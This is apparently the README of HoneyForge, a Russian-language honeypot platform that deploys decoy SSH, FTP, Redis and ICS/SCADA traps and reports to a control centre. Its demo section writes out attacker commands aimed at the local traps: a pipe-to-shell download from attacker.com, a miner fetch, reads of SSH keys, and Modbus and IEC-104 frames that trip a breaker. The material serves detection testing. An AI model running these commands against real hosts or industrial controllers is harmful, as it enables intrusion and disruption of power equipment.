# HoneyForge

Центр управления парком ловушек-приманок (honeypot) и распределенный агент-ловушка.
Оператор (Blue Team / SOC) создаёт ловушки на сайте, разворачивает их агентами
на удалённых хостах и в реальном времени видит активность атакующих, захваченные учетные данные и исполняемые пейлоады.
Исходная постановка задачи — `docs/project_description.pdf`.

---

## 1. Архитектура системы

```
                    ┌──────────────────────── Центр (Go) ────────────────────────┐
  браузер ─────────►│  :8080 веб-сервер ──┬─ статика (login/dashboard/script/css) │
  оператора         │                     └─ /api/* ──прокси──► :8081 API ──► PostgreSQL / In-Memory
                    └──────────────────────────────▲─────────────────────────────┘
                                                    │  POST /cdn-cgi/rum (Stealth Envelope)
                                                    │  POST /api/ingest  (Legacy JSON)
                            односторонний канал ─────┘  ответ всегда 204 No Content
                                                    │
  атакующий ──► сервис-приманка ──► ┌────────── Агент-ловушка (Rust) ──────────┐
                (SSH, Modbus, 104,  │  один бинарник, конфиг едет рядом с ним   │
                 HTTP, FTP, VFS)    │  поднимает ловушку, шлёт телеметрию       │
                                    └───────────────────────────────────────────┘
```

Ключевой принцип: **канал односторонний и скрытный**. Агент только шлёт телеметрию в центр;
из центра к агенту входящие соединения не открываются. Конфиг (с токеном, открытым ключом сервера и параметрами stealth-транспорта) путешествует вместе с бинарником.

- **Скрытный транспорт (Stealth Transport)** — агент отправляет пакеты телеметрии без сохранения
  следов в таблицах соединений ядра (`ss` / `netstat`). Доступны транспорты:
  - `http_nolinger` — отправка через сокет с `SO_LINGER=0`. При закрытии сокета ядро отправляет `TCP RST`,
    минуя состояние `TIME_WAIT`.
  - `udp_burst` — бессессионный одиночный UDP-пакет без вызова `connect()`.
  Телеметрия маскируется под легитимный служебный веб-трафик (маршруты `/cdn-cgi/rum`, `/v1/rgstr`, `/api/v2/metrics`),
  а центр всегда отвечает статусом `204 No Content` для предотвращения зондирования.
- **Асимметричное шифрование Envelope (X25519 + ChaCha20-Poly1305)** — каждое сообщение сжимается
  `gzip` и запечатывается в криптографический конверт (`[KeyID: 8B] || [Ephem_PK: 32B] || [Nonce: 12B] || [Ciphertext+Tag]`):
  одноразовая пара `X25519` + HKDF-SHA256 derivation + ChaCha20-Poly1305. Одноразовый секретный ключ затирается в памяти
  через `zeroize`. Дисковый буфер при обрыве связи сохраняется в виде Base64-строк готовых шифрованных Envelope
  (без хранения открытого JSONL на диске агента).
- **Центр** (`main.go`, `internal/`) — сайт оператора, API, приём и расшифровка телеметрии, PostgreSQL
  (с автоматическим graceful fallback на in-memory хранилище при автономном запуске без СУБД).
- **Агент** (`agent/`, Rust) — компилируется в один бинарник, запускает одну ловушку
  из локального JSON-конфига. Классы: `banner`, `ssh`, `dialog`, `http`, `port_listener`,
  `tarpit`, `honeytoken`, `udp`, `iec104`, `scada`, `high_interaction`, `redis`, `mqtt`, `ssdp`. Поддерживает рандомизированный джиттер и piggybacking heartbeat.
- **Хранилище** (`internal/storage`) — интерфейс `Storage`; реализации `Postgres`
  (рабочая) и `Memory` (тесты и автономный режим). Схема и демо-данные (`migrations/*.sql`) применяются
  при старте в одной транзакции. Окно вычисления статуса `online` составляет 120 секунд с учетом джиттера.
- **Сессии оператора** (`internal/auth`) — токен в HttpOnly-cookie, срок 7 дней.

---

## 2. Классификация ловушек (3-Tier + ICS/SCADA)

HoneyForge разделяет ловушки на четыре специализированных уровня:

### 2.1 Low Interaction (Низкое взаимодействие)
Минимальное потребление ресурсов, обнаружение сканирования сети и первичной разведки:
- **`port_listener`**: Многопортовый слушатель (диапазоны вроде `9000-9003,10443`). Фиксирует подключения; при превышении порога уникальных портов с одного IP (`scan_threshold`) генерирует тревогу `scan`.
- **`banner`**: Сервисный баннер для протоколов, где сервер говорит первым (SSH, FTP, SMTP). Отправляет статический баннер, логирует первый ввод атакующего и закрывает соединение.
- **`tarpit`**: Замедлитель (аналог Endlessh). Удерживает соединение часами (`max_hold_s`), отправляя по байту с задержкой (`delay_ms`), связывая потоки автоматических сканеров. Режимы: `ssh_banner` и `http`.
- **`udp`**: Асинхронный UDP-ответчик для DNS (`helper: "dns"`), NTP, SSDP, SIP. Оснащен защитой от амплификации (`limit_amplification: true`, лимит пакетов в минуту), исключающей использование ловушки в отражённых DDoS-атаках.
- **`low_extra`**: Обнаружение сетевой разведки: SSDP/UPnP `M-SEARCH * HTTP/1.1`, эхо-протоколы RFC 862 Echo, RFC 867 Daytime, RFC 864 Chargen и универсальные TCP-пробы.

### 2.2 Medium Interaction (Среднее взаимодействие)
Диалоговые автоматы, перехват учетных данных и веб-приманки:
- **`dialog`**: Автомат состояний на регулярных выражениях. Эмулирует текстовые протоколы (FTP, SMTP, Telnet, POP3, IMAP, Redis). Перехватывает логины и пароли (`capture: "username"`, `capture: "password"`).
- **`http`**: Веб-приманка с маршрутизацией. Логирует HTTP-запросы, перехватывает учетные данные из HTML-форм (`capture_login: true`), JSON-пейлоадов и заголовков HTTP Basic Auth.
- **`honeytoken`**: HTTP-приёмник ссылок-приманок (Canary URLs). Переход по уникальной ссылке (например, `/share/finance/passwords.xlsx`) моментально генерирует критическое событие `token`.
- **`medium_extra`**:
  - **Redis Wire Protocol**: Парсинг строкового и RESP-протоколов (`*2\r\n$4\r\nAUTH...`). Эмуляция команд `AUTH`, `INFO`, `PING`, перехват паролей БД.
  - **MQTT Telemetry**: Разбор бинарных пакетов `CONNECT` (MQTT 3.1.1 и MQIsdp) на порту 1883, захват Client ID, логинов и паролей IoT-устройств.

### 2.3 High Interaction (`high_interaction`)
Полнофункциональная эмуляция сессии терминала Linux (SSH/Telnet) с виртуальной файловой системой и изоляцией:
- **Stateful In-Memory VFS**:
  - Реалистичная структура директорий (`/bin`, `/etc`, `/var/log`, `/tmp`, `/root`, `/proc`, `/home/operator`).
  - Системные файлы: `/etc/passwd`, `/etc/os-release` (Ubuntu 22.04 LTS), `/etc/hosts`, `/etc/hostname` (`substation-gw01`), `/proc/version`, `/var/log/syslog`.
  - Изменение состояния: команды `cd`, `ls -la`, `mkdir -p`, `touch`, `rm -rf`, `cp`, `mv`, `cat`, `grep`.
- **Сессионный контекст и терминал**:
  - Поддержка `\r\n`, забоя символов (backspace), динамическое обновление приглашения командной строки (`root@substation-gw01:/var/log# `).
- **Перехват пейлоадов и расчет SHA-256**:
  - Захват содержимого при перенаправлении вывода (`> /tmp/mal.sh`, `>> /tmp/mal.sh`).
  - Перехват сетевых загрузок (`curl http://... | sh`, `wget http://... -O /tmp/bin`).
  - Перехват декодирования Base64 (`echo "..." | base64 -d > /tmp/elf`).
  - Расчет криптографического хэша SHA-256, размера пейлоада и создание событий `command` и `payload`.
- **Honeytoken-файлы в VFS**:
  - Приманки: `/root/.env`, `/root/.ssh/id_rsa`, `/etc/scada/plc_auth.conf`. Любая попытка чтения (`cat`, `head`, `grep`, `nano`) моментально создает тревогу `token`.
- **Маскировка (Stealth)**:
  - `ps`, `top`: выводят правдоподобный список процессов (`systemd`, `kthreadd`, `sshd`, `rsyslogd`, `cron`), исключая любые упоминания `honeyforge`.
  - `netstat`, `ss`: скрывают служебные порты телеметрии агента.
  - `env`: скрывает любые служебные переменные окружения `$HF_*`.

### 2.4 ICS / SCADA (АСУ ТП и электроэнергетика)
Специализированные протоколы для защиты критической информационной инфраструктуры (КИИ/OT):
- **`iec104` (IEC 60870-5-104)**:
  - Порт: `2404` (TCP). Стандарт телемеханики подстанций и энергосетей.
  - Поддержка кадров APCI: U-формат (`STARTDT ACT/CON`, `STOPDT`, `TESTFR`), I-формат с контролем последовательности $N(S)$ / $N(R)$, S-формат подтверждения.
  - Поддержка блоков ASDU: общий опрос станции (General Interrogation, тип 100 / `C_IC_NA_1`), одноэлементная команда телеуправления выключателем (тип 45 / `C_SC_NA_1`, IOA `1001`), двухэлементная команда (тип 46 / `C_DC_NA_1`), передача измерений короткого плавающего формата (тип 13 / `M_ME_NC_1`: напряжение 220.5 кВ, мощность 45.2 МВт, частота 50.0 Гц).
- **`scada` (Modbus TCP & Web HMI)**:
  - Порт: `502` (TCP). Эмуляция ПЛК подстанции (Schneider Electric Modicon M580 / ABB RTU).
  - Функции Modbus: FC 01 (Read Coils), FC 02 (Read Discrete Inputs), FC 03 (Read Holding Registers), FC 04 (Read Input Registers), FC 05 (Write Single Coil), FC 06 (Write Single Register), FC 15/16 (Write Multiple Coils/Registers), FC 43 (MEI 14 - чтение Vendor Name, Product Code, Firmware Revision).
  - **Двухрежимный HTTP Fallback**: при отправке HTTP-запроса на порт 502 агент отдает полноценный веб-интерфейс SCADA Web HMI (интерактивная HTML5/SVG мнемосхема подстанции) и REST API (`/api/tags` с JSON-телеметрией датчиков).

---

## 3. Скрытный односторонний транспорт (Stealth Channel)

- **Сетевая маскировка (`http_nolinger` и `SO_LINGER=0`)**:
  - Агент использует сокеты с флагом `SO_LINGER=0`. При закрытии сокета ядро отправляет `TCP RST`, полностью минуя состояние `TIME_WAIT`. В таблицах соединений хоста (`ss -tlpn`, `netstat -an`) не остается никаких следов исходящей телеметрии.
  - Дополнительный транспорт: бессессионный `udp_burst` без вызова `connect()`.
  - Маршруты маскируются под легитимный служебный трафик: `/cdn-cgi/rum`, `/v1/rgstr`, `/api/v2/metrics`.
- **Асимметричное шифрование Envelope**:
  - Структура бинарного конверта (минимум 68 байт):
    `[KeyID: 8B] || [Ephem_PK: 32B] || [Nonce: 12B] || [Ciphertext + Poly1305 Tag: N + 16B]`
  - KeyID: первые 8 байт `SHA-256(trap_token)`.
  - Ephem_PK: одноразовый публичный ключ X25519. Приватный ключ немедленно стирается из памяти (`zeroize`).
  - Содержимое: inner payload `{"t": token, "k": kind, "e": events}` сжимается `gzip` (`flate2`) и шифруется `ChaCha20-Poly1305` с общим ключом, полученным через HKDF-SHA256.
- **Защита от повторов (Anti-Replay) и сканеров**:
  - Центр поддерживает LRU-кэш уникальных 52-байтных ключей (`KeyID + Ephem_PK + Nonce`). При обнаружении повтора пакет отбрасывается (`replay detected`).
  - Все stealth-маршруты центра **всегда возвращают статус `204 No Content`** независимо от успеха дешифрования или ошибок, исключая сканирование периметра.
- **Зашифрованный дисковый буфер (`$HF_BUFFER_PATH`)**:
  - При обрыве связи агент сохраняет готовые Base64-строки шифрованных конвертов на диск (по умолчанию `/tmp/honeyforge-agent-buffer.dat` или путь из `$HF_BUFFER_PATH`).
  - Никакой открытый JSON или данные событий на диск не попадают. При восстановлении связи буфер отправляется в центр в порядке FIFO.

---

## 4. Хосты и удалённое развертывание

**Хост** — сервер, на котором один агент держит все свои ловушки. Оператор
один раз добавляет хост (адрес, SSH-порт, пользователь, пароль или ключ,
sudo), создаёт на нём ловушки и разворачивает агента кнопкой. Агент хоста
получает конфиг со всеми включёнными ловушками (`traps: [...]`), у каждой
свой токен и ключ шифрования, поэтому события в центре остаются привязаны к
конкретной ловушке.

- **SSH-доступ хранится зашифрованным** (AES-256-GCM, `internal/secret`) и в
  браузер не возвращается. Ключ — `HF_SECRET_KEY` или файл
  `HF_SECRET_KEY_FILE` (по умолчанию `data/secret.key`, создаётся при первом
  запуске; в Docker лежит в томе `appdata`). Потеряли ключ — введите пароли
  хостов заново в «Изменить хост».
- **Порты ловушек одного хоста не пересекаются**: центр отвечает `409 port
  conflict` при сохранении, агент дополнительно проверяет это при запуске.
- **«Есть неприменённые изменения»**: центр помнит отпечаток развёрнутого
  набора ловушек и показывает, что конфиг на сервере устарел.
- Ловушки без хоста остаются в разделе «Без хоста»: их можно запустить
  вручную по `config.json` или перенести на хост.

API (все маршруты требуют сессии оператора):

| Метод и путь | Что делает |
|---|---|
| `GET/POST /api/hosts`, `GET/PATCH/DELETE /api/hosts/{id}` | Хосты. Пустой пароль/ключ в `PATCH` — оставить сохранённый. `DELETE` развёрнутого хоста — `409`, пока агент не снят (или `?force=true`). Ловушки удалённого хоста остаются без хоста. |
| `POST /api/hosts/{id}/deploy` | Ставит или обновляет агента со всеми включёнными ловушками хоста. |
| `POST /api/hosts/{id}/undeploy` | Останавливает агента и удаляет его файлы с сервера. |
| `GET /api/hosts/{id}/status` | `systemctl is-active`, слушающие порты и порты ловушек, которые не открыты. |
| `GET /api/hosts/{id}/config` | `config.json` агента хоста для ручного запуска. |
| `POST/PATCH /api/traps` с `hostId` | Привязка ловушки к хосту; `"hostId": null` — отвязать. |

Деплой (`internal/deploy/ssh.go`) идёт по SSH, при необходимости через `sudo`:

1. Бинарник → `/usr/local/bin/honeyforge-agent`, конфиг → `/etc/honeyforge/config.json`,
   unit → `/etc/systemd/system/honeyforge-agent.service`; `restorecon` для SELinux;
   `systemctl daemon-reload && enable && restart`.
2. Проверка: через 3 с служба должна быть `active`. Агент сам занимает все
   порты при старте и при ошибке пишет, какой порт какой ловушки занят, —
   этот текст и возвращается оператору.
3. **Откат**: после успешной проверки версия сохраняется в
   `/var/lib/honeyforge/last-good`. Если новая версия не запустилась,
   возвращается последняя рабочая — ловушки хоста продолжают работать. Если
   возвращать нечего (или и она не стартует), служба останавливается, а хост
   в центре помечается неразвёрнутым.
4. Снятие: `systemctl disable --now`, удаление бинарника, конфига, unit-файла
   и `/var/lib/honeyforge`.

---

## 5. Быстрый старт (Docker Compose)

Полный стенд: PostgreSQL + Центр управления (Go) + Демо-ловушки (Rust-агенты).

```bash
docker compose up -d --build     # или: podman-compose up -d --build
```

- Веб-интерфейс: http://localhost:8080 — учетные данные `admin` / `admin`.
- Демо-ловушки на хосте:
  - SSH-баннер (Low Interaction): `:2222`
  - Fake FTP vsftpd (Medium Interaction): `:2121`

Проверка фиксации атаки в веб-интерфейсе:
```bash
printf 'USER root\r\nPASS hunter2\r\nQUIT\r\n' | nc localhost 2121
```
На вкладке «События» появится захваченная пара логин/пароль, а статус ловушки станет `online`.

---

## 6. Руководство по тестированию

### Тесты бэкенда (Go)
```bash
# Запуск всех тестов проекта
go test -v ./...

# Тестирование отдельных подсистем
go test -v ./internal/handlers/   # API, маршруты телеметрии и защита от повторов
go test -v ./internal/deploy/     # Модуль SSHDeployer
go test -v ./internal/catalog/    # Схемы параметров и пресеты ловушек

# Интеграционный тест PostgreSQL (требуется запущенная СУБД)
TEST_DB_DSN="postgres://honeyforge:honeyforge@localhost:5432/honeyforge?sslmode=disable" \
  go test -v ./internal/storage/
```

### Тесты агента (Rust)
```bash
cd agent

# Проверка компиляции и типов
cargo check

# Запуск полного набора из 78+ тестов
cargo test

# Запуск тестов конкретных ловушек
cargo test -- traps::iec104           # Тесты протокола IEC 60870-5-104
cargo test -- traps::scada            # Тесты Modbus TCP и SCADA HMI
cargo test -- traps::high_interaction # Тесты VFS, перехвата пейлоадов и стелс-команд
cargo test -- traps::low_extra        # Тесты SSDP, Echo, Daytime
cargo test -- traps::medium_extra     # Тесты Redis и MQTT
cargo test -- crypto::                # Тесты криптографического конверта X25519
cargo test -- sender::                # Тесты http_nolinger, буфера и джиттера

# Сборка оптимизированного релизного бинарника
cargo build --release
```

---

## 7. Сценарии демонстрации атак (Live Demo Script)

Точные команды для демонстрации срабатывания каждого класса ловушек:

### 7.1 Low Interaction
```bash
# 1. SSH баннер (порт 2222)
printf "SSH-2.0-OpenSSH_9.6p1\r\n" | nc localhost 2222

# 2. Детектор сканирования портов (порты 9000-9002)
for p in 9000 9001 9002; do nc -z -w 1 localhost $p; done

# 3. Endless Tarpit (порт 2223)
nc -v localhost 2223

# 4. UDP DNS ответчик (порт 1053)
dig @localhost -p 1053 domain.test A

# 5. UPnP/SSDP сетевая разведка (порт 1900)
printf "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: upnp:rootdevice\r\n\r\n" | nc -u localhost 1900
```

### 7.2 Medium Interaction
```bash
# 1. Захват учетных данных FTP (порт 2121)
printf "USER secops\r\nPASS Summer2026!P@ss\r\nQUIT\r\n" | nc localhost 2121

# 2. Захват логина через веб-форму (порт 8080)
curl -i -X POST http://localhost:8080/login -d "username=admin&password=SuperSecretPassword99!"

# 3. Срабатывание Canary Honeytoken URL (порт 8088)
curl -i http://localhost:8088/share/finance/passwords.xlsx

# 4. Перехват аутентификации Redis (порт 6379)
printf "*2\r\n\$4\r\nAUTH\r\n\$12\r\nredis_p@ss99\r\n*1\r\n\$4\r\nINFO\r\n" | nc localhost 6379
```

### 7.3 High Interaction (порт 2224)
Подключитесь к интерактивной терминальной сессии:
```bash
nc localhost 2224
```
Внутри терминала выполните действия злоумышленника:
```bash
# Разведка окружения
whoami; id; uname -a; cat /etc/os-release

# Работа с файловой системой (Stateful VFS)
cd /tmp && echo "malware code" > script.sh && ls -la && cat script.sh

# Срабатывание скрытых Honeytoken-приманок (Генерирует критическую тревогу!)
cat /root/.env
cat /root/.ssh/id_rsa
cat /etc/scada/plc_auth.conf

# Автоматический перехват пейлоада и расчет SHA-256
curl -s http://attacker.com/backdoor.sh | sh
wget http://attacker.com/miner.bin -O /tmp/miner.bin
echo "IyEvYmluL3NoCmVjaG8gIlJDRSIK" | base64 -d > /tmp/rce.sh

# Проверка скрытности (HoneyForge не отображается в процессах и сети)
ps aux
netstat -tlpn
env

exit
```

### 7.4 ICS / SCADA (IEC 60870-5-104 & Modbus TCP)

#### IEC 60870-5-104 (порт 2404)
Скрипт на Python для передачи сессионного U-кадра, общего опроса и команды отключения выключателя:
```python
import socket
s = socket.socket()
s.connect(('localhost', 2404))

# 1. STARTDT ACT -> STARTDT CON (68 04 0b 00 00 00)
s.sendall(bytes.fromhex('680407000000'))
print("STARTDT Response:", s.recv(1024).hex())

# 2. Общий опрос подстанции (General Interrogation, Type 100)
s.sendall(bytes.fromhex('680e0000000064010600010000000014'))
print("GI Response length:", len(s.recv(2048)))

# 3. Отключение силового выключателя Q0 (Single Command, Type 45, IOA 1001, Value=0)
s.sendall(bytes.fromhex('680e020002002d0106000100e9030000'))
print("Command Response:", s.recv(1024).hex())
s.close()
```

#### Modbus TCP & SCADA Web HMI (порт 502)
Запрос телеметрии и отключение выключателя через Modbus:
```python
import socket
s = socket.socket()
s.connect(('localhost', 502))

# Чтение Holding-регистров (FC 03, адрес 0, 5 регистров: напряжение, ток, частота, температура)
s.sendall(bytes.fromhex('000100000006010300000005'))
print("Modbus Registers Response:", s.recv(1024).hex())

# Отключение выключателя Q0 (Write Single Coil, FC 05, адрес 0, значение 0x0000)
s.sendall(bytes.fromhex('000200000006010500000000'))
print("Modbus Coil Response:", s.recv(1024).hex())

# Чтение идентификатора устройства (MEI 14, FC 43: Schneider Electric Modicon M580)
s.sendall(bytes.fromhex('000300000005012b0e0100'))
print("Device ID:", s.recv(1024))
s.close()
```

Веб-интерфейс SCADA Web HMI и REST API на порту 502:
```bash
# Получение интерактивной HTML5 мнемосхемы подстанции
curl -i http://localhost:502/

# Получение показаний датчиков в формате JSON
curl -i http://localhost:502/api/tags
```

---

## 8. Переменные окружения (Центр управления)

| Переменная           | По умолчанию        | Назначение                                     |
|----------------------|---------------------|------------------------------------------------|
| `WEB_ADDR`           | `:8080`             | Адрес веб-сервера                               |
| `API_ADDR`           | `127.0.0.1:8081`    | Внутренний адрес API-сервера                    |
| `STATIC_DIR`         | `./Web`             | Путь к статическим файлам веб-интерфейса        |
| `PUBLIC_URL`         | — (из запроса)      | Внешний URL центра для формируемых конфигов     |
| `HF_SECRET_KEY`      | —                   | Ключ шифрования SSH-доступа к хостам: 64 hex-символа, base64 от 32 байт или фраза от 16 символов |
| `HF_SECRET_KEY_FILE` | `data/secret.key`   | Файл ключа, если `HF_SECRET_KEY` не задан (создаётся при первом запуске, права `0600`) |
| `HF_AGENT_BIN`, `HF_AGENT_SERVICE` | `agent/target/release/honeyforge-agent`, `agent/honeyforge-agent.service` | Бинарник агента и unit-файл для деплоя по SSH |
| `ALLOW_REGISTRATION` | `true`              | `false` — запрет регистрации новых операторов  |
| `DEMO_DATA`          | `false`             | `true` — центр генерирует демо-атаки на включённые ловушки (неделя истории и новые события каждые несколько секунд). При запуске с `false` демо-события удаляются, настоящие не трогаются |
| `DB_DSN` / `DATABASE_URL` | —              | Строка подключения к PostgreSQL                |
| `DB_HOST`, `DB_PORT`, `DB_USER`, `DB_PASSWORD`, `DB_NAME`, `DB_SSLMODE` | `localhost`, `5432`, `postgres`, `postgres`, `honeyforge`, `disable` | Параметры подключения к СУБД |

---

## 9. Автономный запуск (без Docker)

Сервер HoneyForge автоматически переключается в in-memory режим, если PostgreSQL не настроен или недоступен:

```bash
# 1. Запуск центра управления
go run .

# 2. Сборка и запуск агента
cd agent
cargo run -- /path/to/config.json
```
